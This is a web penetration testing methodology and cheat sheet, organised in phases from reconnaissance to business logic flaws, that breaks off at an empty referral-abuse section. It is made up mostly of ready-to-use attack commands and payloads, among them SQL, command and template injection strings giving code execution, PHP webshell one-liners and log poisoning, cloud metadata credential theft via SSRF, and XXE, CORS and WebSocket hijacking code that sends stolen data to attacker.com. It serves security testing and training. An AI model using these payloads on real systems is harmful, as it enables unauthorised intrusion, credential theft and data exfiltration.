# Complete Penetration Testing Methodology

## Professional Background
This methodology combines expertise from:
- **OWASP Testing Guide v4.2** - All 12 categories
- **PTES** (Penetration Testing Execution Standard)
- **WAHH** (Web Application Hacker's Handbook)
- **SANS/CEH** methodologies
- **Bug Bounty Best Practices** (HackerOne, Bugcrowd, Synack)

---

## Phase 1: Information Gathering

### 1.1 Passive OSINT (No Direct Target Contact)

#### Certificate Transparency
```bash
# Certificate search engines
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].common_name' | sort -u

# Subdomain extraction
certspotter -domain target.com
```

#### DNS Intelligence
```bash
# DNS history
curl -s "https://dns.bufferover.run/dns?q=.target.com" | jq -r '.FDNS_A[],.RDNS[]' | cut -d',' -f2 | sort -u

# DNS dumpster (manual web interface)
# https://dnsdumpster.com/

# Passive DNS
dnsrecon -d target.com -t std
fierce --domain target.com
```

#### Web Archives
```bash
# Wayback Machine URLs
waybackurls target.com | tee wayback.txt
gau target.com | tee gau.txt

# Advanced: Historical endpoints
cat wayback.txt | unfurl format %s://%d%p | sort -u
cat wayback.txt | unfurl keys | sort -u > historical-params.txt
```

#### Search Engine Dorking
```bash
# Google dorks
site:target.com
site:target.com ext:php
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com filetype:log
site:*.target.com -www
site:target.com inurl:& | inurl:=

# GitHub secret hunting
site:github.com "target.com" "api_key"
site:github.com "target.com" "password"
site:github.com "target.com" extension:env
```

#### Shodan/Censys
```bash
# Shodan queries
org:"Target Company"
hostname:target.com
ssl:"target.com"

# Censys (censys.io)
# Search by certificates, domains, IPs
```

### 1.2 Active Reconnaissance

#### Subdomain Discovery
```bash
# Comprehensive subdomain enumeration
subfinder -d target.com -all -recursive -o subfinder.txt
assetfinder --subs-only target.com | tee assetfinder.txt
amass enum -passive -d target.com -o amass.txt
chaos -d target.com -o chaos.txt

# Merge and deduplicate
cat subfinder.txt assetfinder.txt amass.txt chaos.txt | sort -u > all-subdomains.txt

# DNS validation
dnsx -l all-subdomains.txt -o live-subdomains.txt
```

#### HTTP Probing & Technology Detection
```bash
# Probe for live web services
httpx -l live-subdomains.txt -status-code -title -tech-detect -web-server -content-length -o alive-web.txt

# Screenshot for visual inspection
gowitness file -f alive-web.txt

# Technology fingerprinting
whatweb -i alive-web.txt --aggression 3
nuclei -l alive-web.txt -t technologies/
```

#### Port Scanning
```bash
# Fast port discovery
naabu -l live-subdomains.txt -top-ports 1000 -o ports.txt

# Comprehensive service detection
nmap -iL live-subdomains.txt -sV -sC -p- -oA nmap-full

# Targeted scanning
nmap -iL live-subdomains.txt -p 80,443,8080,8443,8000,8888,3000,9090 -sV -oA nmap-web
```

#### Virtual Host Discovery
```bash
# Vhost fuzzing
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc all -fc 404

# IP-based vhost discovery
ffuf -u https://TARGET_IP -H "Host: FUZZ.target.com" -w subdomains.txt
```

#### Directory & File Discovery
```bash
# Fast fuzzing
ffuf -u https://target.com/FUZZ -w ~/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -o ffuf-dirs.txt

# Recursive directory discovery
feroxbuster -u https://target.com -w ~/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt --depth 3

# Backup file discovery
ffuf -u https://target.com/FUZZ -w ~/wordlists/backup-files.txt

# Common patterns
https://target.com/.git/
https://target.com/.env
https://target.com/backup.sql
https://target.com/config.php.bak
https://target.com/admin.php.old
```

#### Parameter Discovery
```bash
# Historical parameters from archives
waybackurls target.com | unfurl keys | sort -u > params.txt

# Active parameter discovery
arjun -u https://target.com/endpoint
paramspider -d target.com

# Parameter fuzzing
ffuf -u https://target.com/page?FUZZ=value -w ~/wordlists/parameters.txt
```

#### JavaScript Analysis
```bash
# Discover JS files
katana -u https://target.com -jc | tee js-files.txt
subjs -i alive-web.txt | tee js-files2.txt

# Extract endpoints from JS
cat js-files.txt | while read url; do
  python3 ~/tools/LinkFinder/linkfinder.py -i "$url" -o cli
done | tee js-endpoints.txt

# Extract secrets
cat js-files.txt | xargs -I{} curl -s {} | grep -Eo "(api_key|apikey|access_token|secret_key|client_id)=[a-zA-Z0-9]+"
```

#### API Discovery
```bash
# API endpoint discovery
ffuf -u https://target.com/api/FUZZ -w ~/wordlists/api-endpoints.txt

# Kiterunner for API routes
kr scan https://target.com/api -w routes-large.kite

# GraphQL detection
cat alive-web.txt | while read url; do
  curl -s "$url/graphql" -d '{"query":"{__schema{types{name}}}"}' -H "Content-Type: application/json" && echo "$url has GraphQL"
done

# Check common API paths
/api/v1/
/api/v2/
/graphql
/graphiql
/api-docs
/swagger.json
/openapi.json
```

#### Cloud Asset Discovery
```bash
# S3 bucket enumeration
aws s3 ls s3://target-company
aws s3 ls s3://target

# Cloud storage patterns
https://target.s3.amazonaws.com
https://target-backup.s3.amazonaws.com
https://target.blob.core.windows.net
https://storage.googleapis.com/target-bucket

# Subdomain takeover check
subjack -w live-subdomains.txt -t 100 -o takeover.txt
```

---

## Phase 2: Automated Vulnerability Assessment

### 2.1 Nuclei Scanning Strategy
```bash
# Critical/High severity exposures
nuclei -l alive-web.txt -t exposures/ -severity critical,high -o nuclei-critical.txt

# CVE scanning
nuclei -l alive-web.txt -t cves/ -severity critical,high,medium

# Configuration issues
nuclei -l alive-web.txt -t misconfiguration/

# Technology-specific
nuclei -l alive-web.txt -t technologies/wordpress/
nuclei -l alive-web.txt -t technologies/jenkins/
nuclei -l alive-web.txt -t technologies/jira/

# All templates (comprehensive)
nuclei -l alive-web.txt -t ~/nuclei-templates/ -o nuclei-all.txt
```

### 2.2 Web Vulnerability Scanners
```bash
# Nikto
nikto -h https://target.com -o nikto-results.txt

# Wapiti
wapiti -u https://target.com --scope domain -o wapiti-report

# CMS-specific
wpscan --url https://wordpress.target.com --api-token YOUR_TOKEN
joomscan -u https://joomla.target.com
```

### 2.3 SSL/TLS Testing
```bash
# Comprehensive SSL testing
testssl.sh https://target.com

# Quick SSL scan
sslscan target.com

# Check for specific vulnerabilities
nmap --script ssl-* -p 443 target.com
```

### 2.4 Security Headers Analysis
```bash
# Check security headers
curl -I https://target.com | grep -iE "(X-Frame-Options|X-XSS-Protection|X-Content-Type-Options|Strict-Transport-Security|Content-Security-Policy)"

# Automated header analysis
nuclei -u https://target.com -t http/misconfiguration/http-missing-security-headers.yaml
```

---

## Phase 3: Authentication & Authorization Testing

### 3.1 SQL Injection in Login
```bash
# Manual testing payloads
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1
') OR ('1'='1

# SQLMap automation
sqlmap -u "https://target.com/login" --data "username=test&password=test" --batch --level=2 --risk=2
sqlmap -u "https://target.com/login" --data "username=test&password=test" --technique=BEUSTQ --batch
```

### 3.2 NoSQL Injection
```bash
# MongoDB injection
username[$ne]=admin&password[$ne]=pass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# Redis command injection
\n\r\nSET key value\r\n
```

### 3.3 JWT Vulnerabilities

#### Algorithm Confusion (RS256 → HS256)
```bash
# JWT manipulation
jwt_tool TOKEN -T
jwt_tool TOKEN -X a  # alg:none attack
jwt_tool TOKEN -X k  # key confusion
jwt_tool TOKEN -C -d key=value  # claims manipulation

# Weak secret brute force
jwt-cracker TOKEN wordlist.txt
hashcat -m 16500 jwt.txt rockyou.txt
```

#### JWT Attack Patterns
```
1. Change alg to "none"
2. Brute force HMAC secret
3. RS256 → HS256 key confusion
4. Manipulate claims (user_id, role, is_admin)
5. Check for kid parameter injection
6. Test jku/x5u header manipulation
```

### 3.4 OAuth 2.0 / SAML Exploitation

#### OAuth Attacks
```bash
# redirect_uri bypass
https://target.com/oauth?redirect_uri=https://attacker.com
https://target.com/oauth?redirect_uri=https://target.com.attacker.com
https://target.com/oauth?redirect_uri=https://target.com@attacker.com
https://target.com/oauth?redirect_uri=https://target.com?attacker.com

# State parameter CSRF
# Remove or predict state parameter

# Authorization code replay
# Intercept and reuse authorization code

# Scope elevation
scope=read,write,admin
```

### 3.5 2FA/MFA Bypass Techniques
```bash
# Response manipulation
# Intercept 2FA check and change response from false to true

# Rate limit bypass
# Test unlimited 2FA code attempts

# Backup code enumeration
# Check for predictable backup codes

# Session fixation during 2FA
# Set session cookie before 2FA, use after authentication

# Direct request to authenticated endpoints
# Skip 2FA step entirely via direct access
```

### 3.6 Session Management Testing
```bash
# Session fixation
# Set session ID before login, check if still valid after

# Predictable session tokens
# Collect multiple tokens and analyze for patterns

# Session timeout
# Check if sessions expire after inactivity

# Concurrent sessions
# Login from two places, logout from one, check if both invalidated

# Logout functionality
# Verify session is properly destroyed on logout
```

### 3.7 Password Reset Vulnerabilities
```bash
# Token prediction
# Request multiple reset tokens and analyze

# Host header injection
POST /reset-password HTTP/1.1
Host: attacker.com
# Check if reset link uses attacker.com

# Parameter tampering
email=victim@target.com&email=attacker@evil.com

# Race condition
# Request reset, change email, race to use token

# Token not invalidated after use
# Use reset token multiple times
```

### 3.8 IDOR (Insecure Direct Object Reference)

#### Systematic IDOR Testing
```bash
# Numeric IDs
/api/user/123 → /api/user/124
/api/invoice/100 → /api/invoice/101

# UUIDs (try similar resources)
/api/document/uuid1 → /api/document/uuid2

# Encoded IDs
base64_decode(ID) → increment → base64_encode()

# Array-based
user_ids[]=123 → user_ids[]=124

# Test all HTTP methods
GET /api/user/123
POST /api/user/123
PUT /api/user/123
DELETE /api/user/123
PATCH /api/user/123

# Try missing authorization headers
# Remove JWT token and access resources
```

### 3.9 Horizontal Privilege Escalation
```
User A accessing User B resources:
- Profile information
- Orders/transactions
- Private documents
- Personal settings
- Messages/conversations
```

### 3.10 Vertical Privilege Escalation (User → Admin)
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin", "is_admin": true}

# Mass assignment
POST /api/profile
{"name": "Test", "role": "admin", "permissions": ["all"]}

# Direct access to admin endpoints
/admin
/api/admin/users
/administrator
/wp-admin

# Path traversal in authorization
/api/../../admin/users

# HTTP method tampering
GET /api/user/123 (allowed)
PUT /api/user/123 (check if allowed)
```

---

## Phase 4: Injection Vulnerabilities

### 4.1 SQL Injection

#### Detection Techniques
```bash
# Error-based detection
'
"
`
')
")
; --
' OR '1

# Boolean-based detection
' AND '1'='1
' AND '1'='2

# Time-based detection
' AND SLEEP(5)--
' AND WAITFOR DELAY '0:0:5'--
```

#### Union-Based Exploitation
```sql
# Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (continues until error)

# Find injectable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a','b','c'--

# Extract data
' UNION SELECT username,password,email FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

#### Boolean Blind SQL Injection
```sql
# Character-by-character extraction
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>96--
```

#### Time-Based Blind SQL Injection
```sql
# MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

#### Out-of-Band (OOB) SQL Injection
```sql
# MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\share'))--

# MSSQL
'; DECLARE @q varchar(1024); SET @q='\\\\'+CAST((SELECT password FROM users WHERE username='admin') AS varchar(max))+'.attacker.com\\test'; EXEC master..xp_dirtree @q--
```

#### SQLMap Automation
```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch

# POST request
sqlmap -u "https://target.com/search" --data "q=test" --batch

# Cookie-based injection
sqlmap -u "https://target.com/page" --cookie "session=VALUE" --batch

# Advanced options
sqlmap -u "URL" --level=5 --risk=3 --batch --threads=10

# Dump specific data
sqlmap -u "URL" -D database_name -T users --dump
sqlmap -u "URL" --dbs  # List databases
sqlmap -u "URL" -D database_name --tables  # List tables
```

### 4.2 Cross-Site Scripting (XSS)

#### Reflected XSS
```javascript
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>

# Event handlers
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>

# No spaces
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>

# No parentheses
<script>alert`1`</script>
<script>alert\`1\`</script>
```

#### Stored/Persistent XSS
```javascript
# Test all input fields
# - Profile information
# - Comments/reviews
# - Forum posts
# - File names
# - Chat messages
# - Support tickets

# Persistence locations
# - Database-stored content
# - User profiles
# - Admin panels
# - Log files
```

#### DOM-Based XSS
```javascript
# Check JavaScript sources
# - location.hash
# - location.search
# - document.referrer
# - document.cookie
# - localStorage/sessionStorage

# Common sinks
# - innerHTML
# - document.write
# - eval()
# - setTimeout/setInterval
# - element.setAttribute

# Example payload
https://target.com/page#<img src=x onerror=alert(1)>
```

#### Context-Specific Payloads

**HTML Context:**
```html
<script>alert(1)</script>
```

**JavaScript String Context:**
```javascript
'; alert(1);//
'; alert(1);'
\'; alert(1);//
```

**Event Handler Context:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
```

**JSON Context:**
```json
{"key": "<script>alert(1)<\/script>"}
```

#### Bypass Filters
```javascript
# Uppercase/lowercase variation
<ScRiPt>alert(1)</sCrIpT>

# Encoding
&#60;script&#62;alert(1)&#60;/script&#62;
%3Cscript%3Ealert(1)%3C/script%3E

# Alternative tags
<iframe src="javascript:alert(1)">
<embed src="javascript:alert(1)">
<object data="javascript:alert(1)">

# Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### XSS Tools
```bash
# Dalfox
dalfox url https://target.com/page?q=FUZZ

# XSStrike
python3 xsstrike.py -u "https://target.com/page?q=test"

# Manual testing with Burp Suite Intruder
# Use payload lists from SecLists/Fuzzing/XSS/
```

### 4.3 Command Injection

#### Detection Payloads
```bash
# Basic
; whoami
| whoami
& whoami
&& whoami
|| whoami
` whoami `
$( whoami )

# Time-based detection
; sleep 5
| sleep 5 &
& ping -c 5 127.0.0.1 &
```

#### Bypass Techniques
```bash
# Space bypass
${IFS}
$IFS$9
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd

# Quote manipulation
c'a't /etc/passwd
c"a"t /etc/passwd
c\a\t /etc/passwd

# Command chaining variations
;ls
|ls
||ls
&ls
&&ls
`ls`
$(ls)
```

#### Commix Tool
```bash
# Automated command injection
commix -u "https://target.com/page?cmd=test"
commix --url="https://target.com/page" --data="cmd=test"
```

### 4.4 XML External Entity (XXE)

#### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### Blind XXE with Out-of-Band
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<root></root>

<!-- evil.dtd contents -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

#### XXE in File Uploads
```bash
# SVG files
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

# DOCX/XLSX files (manipulate .xml inside)
# PDF files with XMP metadata
```

#### SSRF via XXE
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### 4.5 Server-Side Template Injection (SSTI)

#### Detection
```bash
# Test payloads
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

#### Jinja2/Django (Python)
```python
# RCE payloads
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

#### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
{{['id']|filter('system')}}
```

#### FreeMarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

#### ERB (Ruby)
```ruby
<%= system("whoami") %>
<%= `whoami` %>
```

### 4.6 LDAP Injection
```bash
# Authentication bypass
*
*)(&
*)(uid=*))(|(uid=*

# Data extraction
admin)(|(password=*))
```

### 4.7 XPath Injection
```bash
# Authentication bypass
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y

# Data extraction
' and count(/*)=1 and '1'='1
```

### 4.8 Header Injection

#### CRLF Injection
```bash
# HTTP response splitting
param=value%0d%0aSet-Cookie:admin=true

# Header injection
Location: %0d%0aSet-Cookie:sessionid=malicious
```

#### Host Header Poisoning
```bash
# Password reset poisoning
GET /reset-password HTTP/1.1
Host: attacker.com

# Cache poisoning
GET / HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
```

---

## Phase 5: Server-Side Vulnerabilities

### 5.1 Server-Side Request Forgery (SSRF)

#### Basic SSRF
```bash
# Internal services
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://internal-service

# Common ports
http://localhost:22
http://localhost:80
http://localhost:443
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:8080
```

#### AWS Metadata Exploitation
```bash
# IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# IMDSv2 (requires token)
# Step 1: Get token
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

#### GCP Metadata
```bash
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### Azure Metadata
```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token
```

#### SSRF Bypass Techniques
```bash
# DNS rebinding
# Create domain that resolves to 127.0.0.1

# Decimal/Hex/Octal IP encoding
http://2130706433  # 127.0.0.1 in decimal
http://0x7f000001  # 127.0.0.1 in hex
http://017700000001  # 127.0.0.1 in octal

# IPv6
http://[::1]
http://[0:0:0:0:0:0:0:1]

# URL schemes
file:///etc/passwd
dict://localhost:6379/INFO
gopher://localhost:6379/_INFO

# @ character
http://attacker.com@localhost
http://localhost@attacker.com

# Domain tricks
http://127.0.0.1.nip.io
http://localhost.attacker.com
```

#### Blind SSRF Detection
```bash
# Out-of-band interaction
http://collaborator.burp
http://attacker.com/callback

# Time-based
http://169.254.169.254 (check response time)
```

### 5.2 Insecure Deserialization

#### Java (ysoserial)
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# Common gadget chains
CommonsCollections1-7
Spring1-2
Groovy1
```

#### PHP (phpggc)
```bash
# Generate payload
phpggc Laravel/RCE1 system "whoami"
phpggc Symfony/RCE4 system "id"

# Serialize PHP object
<?php
$payload = serialize(new Evil());
echo base64_encode($payload);
?>
```

#### Python Pickle
```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

#### Detection
```bash
# Look for serialized data patterns
# Java: rO0 (base64 of 0xaced0005)
# PHP: O:, a:, s: (object, array, string)
# Python: \x80 (pickle protocol)
# .NET: AAEAAAD/ (base64)
```

### 5.3 File Upload Vulnerabilities

#### Extension Bypass
```bash
# Double extension
shell.php.jpg
shell.php.png

# Null byte (old PHP versions)
shell.php%00.jpg

# Case variation
shell.PHP
shell.PhP

# Special characters
shell.php.....
shell.php%20
shell.php::$DATA (Windows)

# Allowed extensions
.phtml
.php3
.php4
.php5
.phar
```

#### Content-Type Manipulation
```bash
# Change Content-Type header
Content-Type: image/jpeg
# But upload PHP shell
```

#### Magic Byte Bypass
```bash
# Add image magic bytes to shell
GIF89a;
<?php system($_GET['cmd']); ?>

# Polyglot files (valid image + valid PHP)
```

#### Path Traversal in Filename
```bash
# Directory traversal
../../../shell.php
..%2F..%2F..%2Fshell.php

# Null byte
../../../shell.php%00.jpg
```

#### XXE/XSS via Uploads
```bash
# SVG with XSS
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

# SVG with XXE
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>
```

### 5.4 Local File Inclusion (LFI) / Remote File Inclusion (RFI)

#### Basic LFI
```bash
# Common payloads
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\logs\access.log
```

#### PHP Wrappers
```php
# php://filter (read source code)
php://filter/convert.base64-encode/resource=index.php

# php://input (POST data as code)
php://input
# POST: <?php system($_GET['cmd']); ?>

# data:// (inline code execution)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# expect:// (command execution)
expect://whoami

# zip:// (upload zip with shell)
zip://shell.zip#shell.php

# phar:// (similar to zip)
phar://shell.phar/shell.php
```

#### Log Poisoning for RCE
```bash
# Poison access log with PHP code
curl https://target.com/page.php -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Include log file
https://target.com/page.php?file=/var/log/apache2/access.log&cmd=whoami
```

#### /proc/self/environ Exploitation
```bash
# Poison environment variable
GET /page.php?file=/proc/self/environ HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Execute
https://target.com/page.php?file=/proc/self/environ&cmd=whoami
```

#### LFI to RCE via Session Files
```php
# Session file location
/var/lib/php/sessions/sess_[SESSION_ID]
/tmp/sess_[SESSION_ID]

# Poison session with PHP code
# Include session file
```

#### Filter Bypass
```bash
# Null byte (old PHP)
/etc/passwd%00

# Path truncation
/etc/passwd................................................................

# Encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 5.5 Path Traversal
```bash
# Basic
../../../etc/passwd
..\..\..\windows\win.ini

# Absolute paths
/etc/passwd
C:\windows\win.ini

# Encoding variations
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Overlong UTF-8
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

---

## Phase 6: Client-Side Vulnerabilities

### 6.1 Cross-Site Request Forgery (CSRF)

#### Token Bypass Techniques
```bash
# Missing token
# Remove CSRF token parameter

# Predictable token
# Analyze token generation pattern

# Token leaked in URL/referer
# Check if token is exposed

# Token not tied to session
# Use any valid token

# Method tampering (POST → GET)
GET /change-password?password=newpass&csrf_token=...
```

#### CSRF Testing Checklist
```html
<!-- Test HTML form -->
<html>
<body>
<form action="https://target.com/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com" />
<input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### 6.2 Clickjacking
```html
<!-- Basic clickjacking -->
<iframe src="https://target.com/delete-account" style="opacity:0.1;position:absolute;"></iframe>
<div style="margin-top:300px;">Click here for prize!</div>

<!-- Frame busting bypass -->
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
```

### 6.3 CORS Misconfiguration

#### Testing
```bash
# Check Access-Control-Allow-Origin
curl -H "Origin: https://evil.com" https://target.com/api/data -v

# Look for dangerous patterns
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: null
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

#### Exploitation
```javascript
// Steal sensitive data via CORS
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        // Send data to attacker
        fetch('https://attacker.com/?data=' + btoa(this.responseText));
    }
};
xhr.open('GET', 'https://target.com/api/sensitive-data', true);
xhr.withCredentials = true;
xhr.send();
```

### 6.4 Open Redirect

#### Common Parameters
```bash
?url=
?redirect=
?next=
?return=
?redirect_url=
?redirect_uri=
?continue=
?dest=
?destination=
?redir=
?rurl=
?return_url=
?checkout_url=
```

#### Bypass Filters
```bash
# @ character
https://target.com@evil.com

# # character
https://target.com#evil.com

# ? character
https://target.com?evil.com

# // slashes
//evil.com
///evil.com
////evil.com

# \\ backslashes
\\evil.com

# Null byte
https://target.com%00.evil.com

# URL encoding
https://target.com%2Eevil.com

# Subdomain takeover
https://attacker.target.com

# Header-based
X-Forwarded-Host: evil.com
```

#### Chain with OAuth Token Theft
```bash
# OAuth redirect to open redirect to steal token
https://target.com/oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
```

### 6.5 PostMessage Vulnerabilities

#### Testing
```javascript
// Listen for messages
window.addEventListener('message', function(e) {
    console.log('Origin:', e.origin);
    console.log('Data:', e.data);
});

// Send malicious message
targetWindow.postMessage(payload, '*');
```

#### Exploitation Patterns
```javascript
// Lack of origin validation
window.addEventListener('message', function(e) {
    // No origin check!
    eval(e.data);  // XSS
    document.getElementById('output').innerHTML = e.data;  // XSS
});
```

---

## Phase 7: API Security

### 7.1 REST API Testing

#### Parameter Pollution
```bash
# Test multiple parameters
GET /api/user?id=123&id=456
GET /api/user?id[]=123&id[]=456
```

#### Mass Assignment
```bash
# Try adding unauthorized fields
POST /api/users
{"username": "test", "role": "admin", "is_admin": true}

PUT /api/profile
{"name": "Test", "account_balance": 999999}
```

#### BOLA/IDOR in APIs
```bash
# Test different user IDs
GET /api/user/123/orders
GET /api/user/124/orders

# Test with missing authentication
# Remove Authorization header
```

#### Excessive Data Exposure
```bash
# Check API responses for sensitive data
GET /api/users
# Look for: passwords, tokens, internal IDs, PII
```

#### Improper HTTP Methods
```bash
# Test all methods on endpoints
GET /api/user/123
POST /api/user/123
PUT /api/user/123
DELETE /api/user/123
PATCH /api/user/123
OPTIONS /api/user/123
```

### 7.2 GraphQL Testing

#### Introspection Query
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

#### Batching Attacks
```graphql
[
  {"query": "{ user(id: 1) { name email } }"},
  {"query": "{ user(id: 2) { name email } }"},
  {"query": "{ user(id: 3) { name email } }"},
  ...
]
```

#### Nested Queries DoS
```graphql
{
  user {
    posts {
      comments {
        user {
          posts {
            comments {
              # ... deeply nested
            }
          }
        }
      }
    }
  }
}
```

#### Field Suggestions
```graphql
# Typo to get suggestions
{ usr { name } }
# Error might reveal: "Did you mean 'user'?"
```

#### IDOR in Resolvers
```graphql
{ user(id: 123) { private_data } }
{ user(id: 124) { private_data } }
```

### 7.3 SOAP/XML-RPC

#### XXE in SOAP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<getData>&xxe;</getData>
</soap:Body>
</soap:Envelope>
```

#### WSDL Enumeration
```bash
# Get WSDL
curl https://target.com/service?WSDL
curl https://target.com/service.asmx?WSDL
```

### 7.4 WebSocket Security

#### Authentication Bypass
```javascript
// Connect without authentication
var ws = new WebSocket('wss://target.com/ws');

// Test if messages are accepted
ws.onopen = function() {
    ws.send(JSON.stringify({action: 'admin_command'}));
};
```

#### Message Injection
```javascript
// Inject malicious messages
ws.send('{"type":"command","data":"<script>alert(1)</script>"}');
```

#### CSWSH (Cross-Site WebSocket Hijacking)
```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(event) {
    // Exfiltrate data to attacker
    fetch('https://attacker.com/?data=' + event.data);
};
</script>
```

---

## Phase 8: Business Logic Flaws

### 8.1 Race Conditions
```bash
# TOCTOU (Time-of-Check-Time-of-Use)
# Example: Withdraw money from account with $100
# Send 10 simultaneous requests to withdraw $100

# Parallel request testing
# Use Burp Turbo Intruder or custom script
for i in {1..10}; do
  curl -X POST https://target.com/withdraw -d "amount=100" &
done
```

### 8.2 Price/Quantity Manipulation
```bash
# Negative values
quantity=-1
price=-100

# Integer overflow
quantity=2147483647

# Decimal abuse
price=0.00001
price=0.0

# Currency manipulation
currency=USD → currency=XXX
```

### 8.3 Workflow Bypass
```bash
# Skip payment step
# Go directly from cart to order confirmation

# Access restricted states
# Jump from step 1 to step 5

# Repeat promotional actions
# Use promo code multiple times
```

### 8.4 Coupon/Promo Code Abuse
```bash
# Code enumeration
PROMO2024
SAVE10
WELCOME
NEW2024

# Stacking coupons
code1=SAVE10&code2=EXTRA20

# Reuse codes
# Apply same code multiple times
```

### 8.5 Referral System Exploitation
```bash
